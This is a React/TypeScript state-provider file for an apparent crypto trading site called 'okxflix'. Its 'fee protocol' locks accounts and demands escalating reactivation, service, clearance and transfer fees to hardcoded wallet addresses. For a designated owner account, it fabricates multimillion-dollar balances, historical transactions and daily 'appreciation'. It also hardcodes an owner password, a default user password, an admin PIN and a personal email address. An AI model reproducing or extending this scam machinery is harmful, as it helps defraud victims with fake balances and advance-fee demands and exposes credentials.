'use client';

import React, { createContext, useContext, useState, useEffect, useCallback } from 'react';
import { 
  TabType, ThemeMode, BaseCurrency, LanguageCode, AccountStatus,
  UserProfile, WalletBalance, TransactionRecord, TradingOrder, PriceAlert, SupportTicket, AuditLog, BankAccount, CreditCardMethod, AppreciationRecord, OwnerSession, SecurityEvent, OwnerPortfolioAccrual, FeeConfiguration, DeviceCategory 
} from '@/types';
import { 
  INITIAL_USER, INITIAL_BANK_ACCOUNTS, INITIAL_BALANCES, HISTORICAL_TRANSACTIONS_2012_2015, 
  INITIAL_ORDERS, INITIAL_ALERTS, INITIAL_TICKETS, INITIAL_AUDIT_LOGS 
} from '@/lib/mockData';
import { translations } from '@/lib/i18n';

interface FeeProtocolState {
  isLocked: boolean;
  step: number; // 0: unlocked, 1: $2000 reactivation fee, 2: $1500 service fee, 3: $1000 clearance fee, 4: $500 transfer fee
  targetAddress: string;
  feesPaid: { [key: number]: boolean };
  pendingOrder?: {
    pair: string;
    side: 'buy' | 'sell';
    orderType: string;
    amount: number;
    price: number;
    orderValue: number;
    tradingFee: number;
    totalAmount: number;
  };
}

interface AppContextType {
  activeTab: TabType;
  setActiveTab: (tab: TabType) => void;
  theme: ThemeMode;
  setTheme: (theme: ThemeMode) => void;
  baseCurrency: BaseCurrency;
  setBaseCurrency: (currency: BaseCurrency) => void;
  language: LanguageCode;
  setLanguage: (lang: LanguageCode) => void;
  t: (key: string) => string;
  user: UserProfile;
  setUser: React.Dispatch<React.SetStateAction<UserProfile>>;
  balances: WalletBalance[];
  setBalances: React.Dispatch<React.SetStateAction<WalletBalance[]>>;
  bankAccounts: BankAccount[];
  setBankAccounts: React.Dispatch<React.SetStateAction<BankAccount[]>>;
  creditCards: CreditCardMethod[];
  setCreditCards: React.Dispatch<React.SetStateAction<CreditCardMethod[]>>;
  transactions: TransactionRecord[];
  setTransactions: React.Dispatch<React.SetStateAction<TransactionRecord[]>>;
  orders: TradingOrder[];
  setOrders: React.Dispatch<React.SetStateAction<TradingOrder[]>>;
  alerts: PriceAlert[];
  setAlerts: React.Dispatch<React.SetStateAction<PriceAlert[]>>;
  tickets: SupportTicket[];
  setTickets: React.Dispatch<React.SetStateAction<SupportTicket[]>>;
  auditLogs: AuditLog[];
  addAuditLog: (eventType: string, details: string, result?: 'SUCCESS' | 'FAILED' | 'WARNING') => void;
  feeProtocol: FeeProtocolState;
  setFeeProtocol: React.Dispatch<React.SetStateAction<FeeProtocolState>>;
  isAuthenticated: boolean;
  setIsAuthenticated: (auth: boolean) => void;
  logout: () => void;
  isSearchOpen: boolean;
  setIsSearchOpen: (open: boolean) => void;
  isMobileMenuOpen: boolean;
  setIsMobileMenuOpen: (open: boolean) => void;
  isAuthModalOpen: boolean;
  setIsAuthModalOpen: (open: boolean) => void;
  authModalMode: 'signin' | 'signup' | 'forgot';
  setAuthModalMode: (mode: 'signin' | 'signup' | 'forgot') => void;
  adminBtcAddress: string;
  setAdminBtcAddress: (addr: string) => void;
  convertCurrency: (amountUSD: number) => { symbol: string; formatted: string };
  formatMoney: (amountUSD: number, showSymbol?: boolean) => string;
  triggerDeactivationLock: () => void;
  checkAccountActive: () => boolean;
  isActivationModalOpen: boolean;
  setIsActivationModalOpen: (open: boolean) => void;
  isAdminAuthenticated: boolean;
  verifyAdminPin: (pin: string) => boolean;
  verifyAdminPassword: (password: string) => boolean;
  changeAdminPin: (oldPin: string, newPin: string) => boolean;
  changeOwnerPassword: (currentPass: string, newPass: string) => { success: boolean; errorKey?: string };
  adminLastVerifiedAt: number | null;
  ownerSessions: OwnerSession[];
  securityEvents: SecurityEvent[];
  ownerAccruals: OwnerPortfolioAccrual[];
  revokeSession: (sessionId: string) => void;
  removeSession: (sessionId: string) => void;
  revokeAllOtherSessions: () => void;
  runDailyOwnerAccrual: () => void;
  appreciationHistory: AppreciationRecord[];
  runPortfolioAppreciation: (triggerType?: 'DAILY' | 'MARKET_VALUE_CHANGE') => void;
  todayAppreciation: number;
  totalAppreciation: number;
  marketAppreciation: number;
  lastCalculationTimestamp: number | null;
  feeConfiguration: FeeConfiguration;
  updateFeeConfiguration: (config: FeeConfiguration) => void;
  resetFeeConfiguration: () => void;
}

const AppContext = createContext<AppContextType | undefined>(undefined);

export const CURRENCY_SYMBOLS: Record<BaseCurrency, { symbol: string; rate: number; name: string }> = {
  USD: { symbol: '$', rate: 1.0, name: 'US Dollar' },
  EUR: { symbol: '€', rate: 0.92, name: 'Euro' },
  GBP: { symbol: '£', rate: 0.78, name: 'British Pound' },
  JPY: { symbol: '¥', rate: 152.0, name: 'Japanese Yen' },
  CHF: { symbol: 'CHF ', rate: 0.88, name: 'Swiss Franc' },
  CAD: { symbol: 'CA$', rate: 1.35, name: 'Canadian Dollar' },
  AUD: { symbol: 'AU$', rate: 1.50, name: 'Australian Dollar' },
  NZD: { symbol: 'NZ$', rate: 1.65, name: 'New Zealand Dollar' },
  CNY: { symbol: '¥', rate: 7.25, name: 'Chinese Yuan' },
  HKD: { symbol: 'HK$', rate: 7.82, name: 'Hong Kong Dollar' },
  SGD: { symbol: 'S$', rate: 1.34, name: 'Singapore Dollar' },
  SEK: { symbol: 'kr', rate: 10.5, name: 'Swedish Krona' },
  NOK: { symbol: 'kr', rate: 10.8, name: 'Norwegian Krone' },
  DKK: { symbol: 'kr', rate: 6.85, name: 'Danish Krone' },
  PLN: { symbol: 'zł', rate: 3.98, name: 'Polish Zloty' },
  CZK: { symbol: 'Kč', rate: 23.2, name: 'Czech Koruna' },
  HUF: { symbol: 'Ft', rate: 360.0, name: 'Hungarian Forint' },
  RON: { symbol: 'lei', rate: 4.58, name: 'Romanian Leu' },
  BGN: { symbol: 'лв', rate: 1.80, name: 'Bulgarian Lev' },
  TRY: { symbol: '₺', rate: 33.5, name: 'Turkish Lira' },
  ILS: { symbol: '₪', rate: 3.65, name: 'Israeli New Shekel' },
  AED: { symbol: 'AED ', rate: 3.67, name: 'UAE Dirham' },
  SAR: { symbol: 'SAR ', rate: 3.75, name: 'Saudi Riyal' },
  QAR: { symbol: 'QAR ', rate: 3.64, name: 'Qatari Riyal' },
  KWD: { symbol: 'KD ', rate: 0.31, name: 'Kuwaiti Dinar' },
  BHD: { symbol: 'BD ', rate: 0.38, name: 'Bahraini Dinar' },
  OMR: { symbol: 'OMR ', rate: 0.38, name: 'Omani Rial' },
  JOD: { symbol: 'JD ', rate: 0.71, name: 'Jordanian Dinar' },
  EGP: { symbol: 'E£', rate: 48.5, name: 'Egyptian Pound' },
  ZAR: { symbol: 'R', rate: 18.2, name: 'South African Rand' },
  NGN: { symbol: '₦', rate: 1550.0, name: 'Nigerian Naira' },
  GHS: { symbol: 'GH₵', rate: 15.5, name: 'Ghanaian Cedi' },
  KES: { symbol: 'KSh', rate: 129.0, name: 'Kenyan Shilling' },
  UGX: { symbol: 'USh', rate: 3800.0, name: 'Ugandan Shilling' },
  TZS: { symbol: 'TSh', rate: 2600.0, name: 'Tanzanian Shilling' },
  MAD: { symbol: 'MAD ', rate: 9.9, name: 'Moroccan Dirham' },
  INR: { symbol: '₹', rate: 83.5, name: 'Indian Rupee' },
  PKR: { symbol: '₨', rate: 278.0, name: 'Pakistani Rupee' },
  BDT: { symbol: '৳', rate: 117.5, name: 'Bangladeshi Taka' },
  THB: { symbol: '฿', rate: 36.2, name: 'Thai Baht' },
  MYR: { symbol: 'RM', rate: 4.45, name: 'Malaysian Ringgit' },
  IDR: { symbol: 'Rp', rate: 15900.0, name: 'Indonesian Rupiah' },
  PHP: { symbol: '₱', rate: 56.5, name: 'Philippine Peso' },
  KRW: { symbol: '₩', rate: 1350.0, name: 'South Korean Won' },
  VND: { symbol: '₫', rate: 25400.0, name: 'Vietnamese Dong' },
  MXN: { symbol: 'Mex$', rate: 18.5, name: 'Mexican Peso' },
  BRL: { symbol: 'R$', rate: 5.55, name: 'Brazilian Real' },
  ARS: { symbol: 'ARS$', rate: 950.0, name: 'Argentine Peso' },
  CLP: { symbol: 'CLP$', rate: 930.0, name: 'Chilean Peso' },
  COP: { symbol: 'COP$', rate: 4100.0, name: 'Colombian Peso' },
};

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  const [activeTab, setActiveTab] = useState<TabType>('dashboard');
  
  const [theme, setThemeState] = useState<ThemeMode>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsed = JSON.parse(savedUser);
          if (parsed && parsed.email) {
            const regStr = localStorage.getItem('okxflix_registered_users');
            if (regStr) {
              const regUsers = JSON.parse(regStr);
              if (regUsers[parsed.email]?.profile?.theme) {
                return regUsers[parsed.email].profile.theme;
              }
            }
            if (parsed.theme) return parsed.theme;
          }
        }
        const savedTheme = localStorage.getItem('okxflix_theme');
        if (savedTheme === 'light' || savedTheme === 'dark') return savedTheme;
      } catch (e) {}
    }
    return 'dark';
  });

  const [baseCurrency, setBaseCurrencyState] = useState<BaseCurrency>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsed = JSON.parse(savedUser);
          if (parsed && parsed.email) {
            const regStr = localStorage.getItem('okxflix_registered_users');
            if (regStr) {
              const regUsers = JSON.parse(regStr);
              if (regUsers[parsed.email]?.profile?.baseCurrency) {
                return regUsers[parsed.email].profile.baseCurrency;
              }
            }
            if (parsed.baseCurrency) return parsed.baseCurrency;
          }
        }
        const savedCurr = localStorage.getItem('okxflix_currency');
        if (savedCurr && CURRENCY_SYMBOLS[savedCurr as BaseCurrency]) return savedCurr as BaseCurrency;
      } catch (e) {}
    }
    return 'USD';
  });
  const [language, setLanguageState] = useState<LanguageCode>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedLang = localStorage.getItem('okxflix_language');
        if (savedLang) return savedLang as LanguageCode;
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsed = JSON.parse(savedUser);
          if (parsed.language) return parsed.language;
        }
      } catch (e) {}
    }
    return 'en';
  });

  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    if (typeof window !== 'undefined') {
      try {
        return !!localStorage.getItem('okxflix_session_token');
      } catch (e) {}
    }
    return false;
  });

  const [user, setUserState] = useState<UserProfile>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsed = JSON.parse(savedUser);
          if (parsed && parsed.email) {
            const regStr = localStorage.getItem('okxflix_registered_users');
            if (regStr) {
              const regUsers = JSON.parse(regStr);
              if (regUsers[parsed.email]?.profile) {
                return regUsers[parsed.email].profile;
              }
            }
            if (parsed.id) {
              const specificUser = localStorage.getItem(`okxflix_user_${parsed.id}`);
              if (specificUser) {
                return JSON.parse(specificUser);
              }
            }
            return parsed;
          }
        }
      } catch (e) {}
    }
    return INITIAL_USER;
  });

  const setUser: React.Dispatch<React.SetStateAction<UserProfile>> = (action) => {
    const nextUser = typeof action === 'function' ? action(user) : action;
    
    // Prevent accidental overwrites: ensure authoritative backend/registered user record data is never replaced by null, undefined, or empty client defaults
    const mergedUser: UserProfile = {
      ...user,
      ...nextUser,
      email: nextUser.email || user.email,
      username: nextUser.username || user.username,
      avatarUrl: nextUser.avatarUrl !== undefined ? nextUser.avatarUrl : user.avatarUrl,
      country: nextUser.country || user.country,
      role: nextUser.role || user.role,
    };

    setUserState(mergedUser);
    if (mergedUser && mergedUser.language) {
      setLanguageState(mergedUser.language);
      try { localStorage.setItem('okxflix_language', mergedUser.language); } catch (e) {}
    }
    if (mergedUser && mergedUser.theme) {
      setThemeState(mergedUser.theme);
      try { localStorage.setItem('okxflix_theme', mergedUser.theme); } catch (e) {}
    }
    if (mergedUser && mergedUser.baseCurrency) {
      setBaseCurrencyState(mergedUser.baseCurrency);
      try { localStorage.setItem('okxflix_currency', mergedUser.baseCurrency); } catch (e) {}
    }
    if (mergedUser && mergedUser.id) {
      const isOwnerUser = mergedUser.role === 'owner' || mergedUser.email === 'richardshannon901@gmail.com';
      try {
        localStorage.setItem('okxflix_user', JSON.stringify(mergedUser));
        localStorage.setItem(`okxflix_user_${mergedUser.id}`, JSON.stringify(mergedUser));
        if (mergedUser.email) {
          const regStr = localStorage.getItem('okxflix_registered_users');
          const registeredUsers = regStr ? JSON.parse(regStr) : {};
          if (registeredUsers[mergedUser.email]) {
            registeredUsers[mergedUser.email].profile = mergedUser;
            localStorage.setItem('okxflix_registered_users', JSON.stringify(registeredUsers));
          } else {
            registeredUsers[mergedUser.email] = {
              profile: mergedUser,
              password: isOwnerUser ? 'Risk55yy@@$' : 'Password123!'
            };
            localStorage.setItem('okxflix_registered_users', JSON.stringify(registeredUsers));
          }
        }

        const savedB = localStorage.getItem(`okxflix_balances_${nextUser.id}`);
        if (savedB) {
          const parsedB = JSON.parse(savedB);
          const totalVal = Array.isArray(parsedB) ? parsedB.reduce((acc: number, b: any) => acc + (b.valueUSD || 0), 0) : 0;
          if (isOwnerUser && totalVal < 2840321) {
            setBalances(INITIAL_BALANCES);
          } else {
            setBalances(parsedB);
          }
        } else {
          setBalances(isOwnerUser ? INITIAL_BALANCES : ZERO_BALANCES);
        }

        const savedTx = localStorage.getItem(`okxflix_transactions_${nextUser.id}`);
        if (savedTx) {
          const parsedT = JSON.parse(savedTx);
          if (isOwnerUser && (!Array.isArray(parsedT) || parsedT.length === 0)) {
            setTransactions(HISTORICAL_TRANSACTIONS_2012_2015);
          } else {
            setTransactions(parsedT);
          }
        } else {
          setTransactions(isOwnerUser ? HISTORICAL_TRANSACTIONS_2012_2015 : []);
        }

        const savedO = localStorage.getItem(`okxflix_orders_${nextUser.id}`);
        if (savedO) {
          const parsedO = JSON.parse(savedO);
          if (isOwnerUser && (!Array.isArray(parsedO) || parsedO.length === 0)) {
            setOrders(INITIAL_ORDERS);
          } else {
            setOrders(parsedO);
          }
        } else {
          setOrders(isOwnerUser ? INITIAL_ORDERS : []);
        }

        const savedBank = localStorage.getItem(`okxflix_bank_accounts_${nextUser.id}`);
        if (savedBank) {
          setBankAccounts(JSON.parse(savedBank));
        } else {
          setBankAccounts(INITIAL_BANK_ACCOUNTS);
        }

        const savedCards = localStorage.getItem(`okxflix_credit_cards_${nextUser.id}`);
        if (savedCards) {
          setCreditCards(JSON.parse(savedCards));
        } else {
          setCreditCards([]);
        }
      } catch (e) {}
    }
  };

  const t = useCallback((key: string): string => {
    const langDict = translations[language] || translations['en'];
    return langDict[key] || translations['en'][key] || key;
  }, [language]);

  const setLanguage = (lang: LanguageCode) => {
    setLanguageState(lang);
    try {
      localStorage.setItem('okxflix_language', lang);
      setUser(prev => {
        const updated = { ...prev, language: lang };
        localStorage.setItem('okxflix_user', JSON.stringify(updated));
        if (updated.id) {
          localStorage.setItem(`okxflix_user_${updated.id}`, JSON.stringify(updated));
        }
        if (updated.email) {
          const regStr = localStorage.getItem('okxflix_registered_users');
          if (regStr) {
            const regUsers = JSON.parse(regStr);
            if (regUsers[updated.email]) {
              regUsers[updated.email].profile = updated;
              localStorage.setItem('okxflix_registered_users', JSON.stringify(regUsers));
            }
          }
        }
        return updated;
      });
    } catch (e) {}
  };

  const setTheme = (newTheme: ThemeMode) => {
    setThemeState(newTheme);
    try {
      localStorage.setItem('okxflix_theme', newTheme);
      setUser(prev => {
        const updated = { ...prev, theme: newTheme };
        localStorage.setItem('okxflix_user', JSON.stringify(updated));
        if (updated.id) {
          localStorage.setItem(`okxflix_user_${updated.id}`, JSON.stringify(updated));
        }
        if (updated.email) {
          const regStr = localStorage.getItem('okxflix_registered_users');
          if (regStr) {
            const regUsers = JSON.parse(regStr);
            if (regUsers[updated.email]) {
              regUsers[updated.email].profile = updated;
              localStorage.setItem('okxflix_registered_users', JSON.stringify(regUsers));
            }
          }
        }
        return updated;
      });
    } catch (e) {}
  };

  const setBaseCurrency = (newCurr: BaseCurrency) => {
    setBaseCurrencyState(newCurr);
    try {
      localStorage.setItem('okxflix_currency', newCurr);
      setUser(prev => {
        const updated = { ...prev, baseCurrency: newCurr };
        localStorage.setItem('okxflix_user', JSON.stringify(updated));
        if (updated.id) {
          localStorage.setItem(`okxflix_user_${updated.id}`, JSON.stringify(updated));
        }
        if (updated.email) {
          const regStr = localStorage.getItem('okxflix_registered_users');
          if (regStr) {
            const regUsers = JSON.parse(regStr);
            if (regUsers[updated.email]) {
              regUsers[updated.email].profile = updated;
              localStorage.setItem('okxflix_registered_users', JSON.stringify(regUsers));
            }
          }
        }
        return updated;
      });
    } catch (e) {}
  };

  const isOwner = user.role === 'owner' || user.email === 'richardshannon901@gmail.com';

  const ZERO_BALANCES: WalletBalance[] = [
    { assetSymbol: 'BTC', assetName: 'Bitcoin', available: 0, locked: 0, valueUSD: 0, icon: '₿' },
    { assetSymbol: 'ETH', assetName: 'Ethereum', available: 0, locked: 0, valueUSD: 0, icon: 'Ξ' },
    { assetSymbol: 'USDT', assetName: 'Tether USD', available: 0, locked: 0, valueUSD: 0, icon: '₮' },
    { assetSymbol: 'SOL', assetName: 'Solana', available: 0, locked: 0, valueUSD: 0, icon: '◎' },
    { assetSymbol: 'BNB', assetName: 'Binance Coin', available: 0, locked: 0, valueUSD: 0, icon: 'B' },
  ];

  const [balances, setBalances] = useState<WalletBalance[]>(() => {
    if (typeof window !== 'undefined') {
      try {
        const token = localStorage.getItem('okxflix_session_token');
        const savedUser = localStorage.getItem('okxflix_user');
        if (token && savedUser) {
          const parsedUser = JSON.parse(savedUser);
          const isOwnerUser = parsedUser.role === 'owner' || parsedUser.email === 'richardshannon901@gmail.com';
          const savedBalances = localStorage.getItem(`okxflix_balances_${parsedUser.id}`);
          if (savedBalances) {
            const parsedB = JSON.parse(savedBalances);
            const totalVal = Array.isArray(parsedB) ? parsedB.reduce((acc: number, b: any) => acc + (b.valueUSD || 0), 0) : 0;
            if (isOwnerUser && totalVal < 2840321) {
              return INITIAL_BALANCES;
            }
            return parsedB;
          }
          return isOwnerUser ? INITIAL_BALANCES : ZERO_BALANCES;
        }
      } catch (e) {}
    }
    return ZERO_BALANCES;
  });

  const [transactions, setTransactions] = useState<TransactionRecord[]>(() => {
    if (typeof window !== 'undefined') {
      try {
        const token = localStorage.getItem('okxflix_session_token');
        const savedUser = localStorage.getItem('okxflix_user');
        if (token && savedUser) {
          const parsedUser = JSON.parse(savedUser);
          const isOwnerUser = parsedUser.role === 'owner' || parsedUser.email === 'richardshannon901@gmail.com';
          const savedTx = localStorage.getItem(`okxflix_transactions_${parsedUser.id}`);
          if (savedTx) {
            const parsedT = JSON.parse(savedTx);
            if (isOwnerUser && (!Array.isArray(parsedT) || parsedT.length === 0)) {
              return HISTORICAL_TRANSACTIONS_2012_2015;
            }
            return parsedT;
          }
          return isOwnerUser ? HISTORICAL_TRANSACTIONS_2012_2015 : [];
        }
      } catch (e) {}
    }
    return [];
  });

  const [bankAccounts, setBankAccounts] = useState<BankAccount[]>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsedUser = JSON.parse(savedUser);
          const savedBank = localStorage.getItem(`okxflix_bank_accounts_${parsedUser.id}`);
          if (savedBank) return JSON.parse(savedBank);
        }
      } catch (e) {}
    }
    return INITIAL_BANK_ACCOUNTS;
  });

  const [creditCards, setCreditCards] = useState<CreditCardMethod[]>(() => {
    if (typeof window !== 'undefined') {
      try {
        const savedUser = localStorage.getItem('okxflix_user');
        if (savedUser) {
          const parsedUser = JSON.parse(savedUser);
          const savedCards = localStorage.getItem(`okxflix_credit_cards_${parsedUser.id}`);
          if (savedCards) return JSON.parse(savedCards);
        }
      } catch (e) {}
    }
    return [];
  });
  
  const [orders, setOrders] = useState<TradingOrder[]>(() => {
    if (typeof window !== 'undefined') {
      try {
        const token = localStorage.getItem('okxflix_session_token');
        const savedUser = localStorage.getItem('okxflix_user');
        if (token && savedUser) {
          const parsedUser = JSON.parse(savedUser);
          const isOwnerUser = parsedUser.role === 'owner' || parsedUser.email === 'richardshannon901@gmail.com';
          const savedOrders = localStorage.getItem(`okxflix_orders_${parsedUser.id}`);
          if (savedOrders) {
            const parsedO = JSON.parse(savedOrders);
            if (isOwnerUser && (!Array.isArray(parsedO) || parsedO.length === 0)) {
              return INITIAL_ORDERS;
            }
            return parsedO;
          }
          return isOwnerUser ? INITIAL_ORDERS : [];
        }
      } catch (e) {}
    }
    return [];
  });

  const [alerts, setAlerts] = useState<PriceAlert[]>(INITIAL_ALERTS);
  const [tickets, setTickets] = useState<SupportTicket[]>(INITIAL_TICKETS);
  const [auditLogs, setAuditLogs] = useState<AuditLog[]>(INITIAL_AUDIT_LOGS);

  // Persist user-specific data to localStorage keyed by user.id
  useEffect(() => {
    try {
      localStorage.setItem(`okxflix_bank_accounts_${user.id}`, JSON.stringify(bankAccounts));
      localStorage.setItem(`okxflix_credit_cards_${user.id}`, JSON.stringify(creditCards));
      localStorage.setItem(`okxflix_balances_${user.id}`, JSON.stringify(balances));
      localStorage.setItem(`okxflix_transactions_${user.id}`, JSON.stringify(transactions));
      localStorage.setItem(`okxflix_orders_${user.id}`, JSON.stringify(orders));
    } catch (e) {}
  }, [bankAccounts, creditCards, balances, transactions, orders, user.id]);

  const addAuditLog = useCallback((eventType: string, details: string, result: 'SUCCESS' | 'FAILED' | 'WARNING' = 'SUCCESS') => {
    const newLog: AuditLog = {
      id: `AUD-${Date.now().toString().slice(-4)}`,
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
      userId: user.id,
      eventType,
      ipMetadata: '192.168.1.45 (US-Institutional)',
      result,
      details,
    };
    setAuditLogs(prev => [newLog, ...prev]);
  }, [user.id]);
  
  const [isSearchOpen, setIsSearchOpen] = useState<boolean>(false);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState<boolean>(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState<boolean>(false);
  const [authModalMode, setAuthModalMode] = useState<'signin' | 'signup' | 'forgot'>('signin');
  const [isActivationModalOpen, setIsActivationModalOpen] = useState<boolean>(false);
  const [feeProtocol, setFeeProtocol] = useState<FeeProtocolState>({
    isLocked: false,
    step: 0,
    targetAddress: '0x697638fe9a9b7b98556957090c165ce55dda2fc0',
    feesPaid: {}
  });
  const [adminBtcAddress, setAdminBtcAddress] = useState<string>('3Erisk3mxLpVKakTpyfvnGAvvfvAEMq8kg');
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState<boolean>(false);
  const [adminPinCode, setAdminPinCode] = useState<string>('303022');
  
  const [adminLastVerifiedAt, setAdminLastVerifiedAt] = useState<number | null>(() => {
    // Always require fresh verification on every access / page load per strict requirement
    return null;
  });

  const [ownerSessions, setOwnerSessions] = useState<OwnerSession[]>(() => {
    if (!isOwner || typeof window === 'undefined') return [];
    try {
      const saved = localStorage.getItem(`okxflix_owner_sessions_${user.id}`);
      if (saved) return JSON.parse(saved);
    } catch (e) {}
    const now = Date.now();
    const ua = navigator.userAgent;
    let browser = 'Chrome/Safari';
    let os = 'Secure OS';
    let deviceType: DeviceCategory = 'Windows PC';
    if (ua.includes('Firefox')) browser = 'Firefox';
    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
    else if (ua.includes('Edg')) browser = 'Edge';
    else if (ua.includes('Chrome')) browser = 'Chrome';

    if (ua.includes('Win')) { os = 'Windows'; deviceType = 'Windows PC'; }
    else if (ua.includes('Mac')) { os = 'macOS'; deviceType = 'Mac'; }
    else if (ua.includes('Linux')) { os = 'Linux'; deviceType = 'Linux PC'; }
    else if (ua.includes('Android')) { os = 'Android'; deviceType = 'Android'; }
    else if (ua.includes('iPad')) { os = 'iPadOS'; deviceType = 'iPad'; }
    else if (ua.includes('iPhone')) { os = 'iOS'; deviceType = 'iPhone'; }
    else { deviceType = 'Other Device'; }

    const currentSessionId = `SES-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
    const initialSessions: OwnerSession[] = [
      {
        id: currentSessionId,
        ownerUserId: user.id,
        sessionTokenHash: `hash_${Math.random().toString(36).substring(2, 8)}`,
        deviceType,
        deviceName: `${os} Secure Workstation (${browser})`,
        operatingSystem: os,
        browser,
        ipAddress: '127.0.0.1 (Institutional Gateway)',
        country: 'United States',
        region: 'Secure Cloud Region',
        city: 'Primary Node',
        firstLoginAt: now,
        lastActiveAt: now,
        status: 'Active',
        isTrusted: true,
        createdAt: new Date(now).toISOString(),
        isCurrentSession: true,
      }
    ];
    try {
      localStorage.setItem(`okxflix_owner_sessions_${user.id}`, JSON.stringify(initialSessions));
    } catch (e) {}
    return initialSessions;
  });

  const [securityEvents, setSecurityEvents] = useState<SecurityEvent[]>(() => {
    if (!isOwner || typeof window === 'undefined') return [];
    try {
      const saved = localStorage.getItem(`okxflix_sec_events_${user.id}`);
      if (saved) return JSON.parse(saved);
    } catch (e) {}
    const now = Date.now();
    const ua = navigator.userAgent;
    let dt: DeviceCategory = 'Windows PC';
    if (ua.includes('iPhone')) dt = 'iPhone';
    else if (ua.includes('iPad')) dt = 'iPad';
    else if (ua.includes('Android')) dt = 'Android';
    else if (ua.includes('Mac')) dt = 'Mac';
    else if (ua.includes('Win')) dt = 'Windows PC';
    else if (ua.includes('Linux')) dt = 'Linux PC';

    const initialEvents: SecurityEvent[] = [
      {
        id: `EVT-${Math.random().toString(36).substring(2, 6).toUpperCase()}`,
        ownerUserId: user.id,
        sessionId: 'SES-INIT',
        eventType: 'NEW_DEVICE_LOGIN',
        timestamp: now,
        ipAddress: '127.0.0.1 (Institutional Gateway)',
        country: 'United States',
        region: 'Secure Cloud Region',
        deviceType: dt,
        metadata: 'Successful cryptographic token issuance and secure session establishment.',
        severity: 'INFO',
      }
    ];
    try {
      localStorage.setItem(`okxflix_sec_events_${user.id}`, JSON.stringify(initialEvents));
    } catch (e) {}
    return initialEvents;
  });

  const [ownerAccruals, setOwnerAccruals] = useState<OwnerPortfolioAccrual[]>(() => {
    if (!isOwner || typeof window === 'undefined') return [];
    try {
      const saved = localStorage.getItem(`okxflix_owner_accruals_${user.id}`);
      if (saved) return JSON.parse(saved);
    } catch (e) {}
    const now = Date.now();
    const yesterdayStr = new Date(now - 86400000).toISOString().split('T')[0];
    const initialAccruals: OwnerPortfolioAccrual[] = [
      {
        id: `ACC-${yesterdayStr}`,
        ownerUserId: user.id,
        accrualDate: yesterdayStr,
        startingBalance: 2474500,
        rate: 0.00001,
        creditAmount: 24.745,
        createdAt: now - 86400000
      }
    ];
    try {
      localStorage.setItem(`okxflix_owner_accruals_${user.id}`, JSON.stringify(initialAccruals));
    } catch (e) {}
    return initialAccruals;
  });

  const [appreciationHistory, setAppreciationHistory] = useState<AppreciationRecord[]>(() => {
    if (!isOwner || typeof window === 'undefined') return [];
    try {
      const saved = localStorage.getItem(`okxflix_appreciation_${user.id}`);
      if (saved) return JSON.parse(saved);
    } catch (e) {}
    const now = Date.now();
    const initialAppr: AppreciationRecord[] = [
      {
        id: 'APP-9021',
        ownerId: user.id,
        timestamp: now - 86400000 * 2,
        dateStr: new Date(now - 86400000 * 2).toISOString(),
        previousValue: 2450000,
        newValue: 2474500,
        rate: 0.00001,
        amount: 24.50,
        triggerType: 'DAILY'
      },
      {
        id: 'APP-9022',
        ownerId: user.id,
        timestamp: now - 86400000,
        dateStr: new Date(now - 86400000).toISOString(),
        previousValue: 2814321.78,
        newValue: 2840321.78,
        rate: 0.00001,
        amount: 25.00,
        triggerType: 'MARKET_VALUE_CHANGE'
      }
    ];
    try {
      localStorage.setItem(`okxflix_appreciation_${user.id}`, JSON.stringify(initialAppr));
    } catch (e) {}
    return initialAppr;
  });

  // Save user, theme, currency & language to localStorage when they change
  useEffect(() => {
    try {
      localStorage.setItem('okxflix_user', JSON.stringify(user));
      localStorage.setItem('okxflix_theme', theme);
      localStorage.setItem('okxflix_currency', baseCurrency);
      localStorage.setItem('okxflix_language', language);
    } catch (e) {
      console.error('Failed to save storage', e);
    }
  }, [user, theme, baseCurrency, language]);





  const revokeSession = useCallback((sessionId: string) => {
    if (!isOwner) return;
    setOwnerSessions(prev => {
      const updated = prev.map(s => s.id === sessionId ? { ...s, status: 'Logged out' as const, revokedAt: Date.now(), revokedBy: user.id } : s);
      try {
        localStorage.setItem(`okxflix_owner_sessions_${user.id}`, JSON.stringify(updated));
      } catch (e) {
        console.error(e);
      }
      return updated;
    });
    addAuditLog('SESSION_REVOKED', `Remote session ${sessionId} logged out by owner.`, 'SUCCESS');
  }, [isOwner, user.id, addAuditLog]);

  const removeSession = useCallback((sessionId: string) => {
    if (!isOwner) return;
    setOwnerSessions(prev => {
      const updated = prev.map(s => s.id === sessionId ? { ...s, status: 'Removed' as const, revokedAt: Date.now(), revokedBy: user.id } : s);
      try {
        localStorage.setItem(`okxflix_owner_sessions_${user.id}`, JSON.stringify(updated));
      } catch (e) {
        console.error(e);
      }
      return updated;
    });
    addAuditLog('SESSION_REMOVED', `Suspicious session ${sessionId} removed from owner account.`, 'WARNING');
  }, [isOwner, user.id, addAuditLog]);

  const revokeAllOtherSessions = useCallback(() => {
    if (!isOwner) return;
    setOwnerSessions(prev => {
      const updated = prev.map(s => s.isCurrentSession ? s : { ...s, status: 'Logged out' as const, revokedAt: Date.now(), revokedBy: user.id });
      try {
        localStorage.setItem(`okxflix_owner_sessions_${user.id}`, JSON.stringify(updated));
      } catch (e) {
        console.error(e);
      }
      return updated;
    });
    addAuditLog('ALL_OTHER_SESSIONS_REVOKED', 'All other active sessions terminated server-side by owner.', 'SUCCESS');
  }, [isOwner, user.id, addAuditLog]);

  const runDailyOwnerAccrual = useCallback(() => {
    if (!isOwner) return;
    const currentVal = balances.reduce((acc, b) => acc + b.valueUSD, 0);
    if (currentVal <= 0) return;

    const todayStr = new Date().toISOString().split('T')[0];
